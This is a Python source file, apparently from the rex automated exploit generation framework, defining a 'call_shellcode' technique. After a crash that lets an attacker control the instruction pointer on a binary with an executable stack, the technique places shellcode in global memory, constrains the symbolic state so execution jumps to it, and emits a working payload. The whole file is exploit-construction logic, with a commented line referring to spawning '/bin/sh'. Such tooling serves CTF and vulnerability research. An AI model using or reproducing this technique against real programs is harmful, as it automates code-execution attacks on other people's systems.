import logging
from rex import Vulnerability
from rex.exploit import Payload, CannotExploit
from ..technique import Technique

l = logging.getLogger("rex.exploit.techniques.linux.call_shellcode")

class CallShellcode(Technique):

    name = "call_shellcode"

    applicable_to = ['cgc', 'unix']

    def apply(self, **kwargs):

        # can only exploit ip overwrites
        ct = self.crash.crash_type
        if ct != Vulnerability.IP_OVERWRITE and ct != Vulnerability.PARTIAL_IP_OVERWRITE:
            raise CannotExploit("[%s] cannot control ip" % self.name)


        if not self.crash.project.loader.main_bin.execstack:
            raise CannotExploit("[%s] stack is not executable" % self.name)

        # try to write shellcode into global memory
        shellcode = self.shellcode.get_default()
        shc_addr, shc_constraint = self._write_global_data(shellcode)
        if shc_addr is None:
            # this function should windup state to do the read
            # we'll also need to lift the size limit on stdin
            # cmd_addr, prechain = self._read_in_data("/bin/sh\x00")
            raise CannotExploit("[%s] cannot write in shellcode" % self.name)

        # apply the constraint that shellcode must exist in memory
        self.crash.state.add_constraints(shc_constraint)

        # add the constraint that the ip must point at the shellcode
        self.crash.state.add_constraints(self.crash.state.ip == shc_addr)

        if not self.crash.state.satisfiable():
            raise CannotExploit("[%s] generated exploit is not satisfiable" % self.name)

        return Payload(self.crash, self.crash.state)
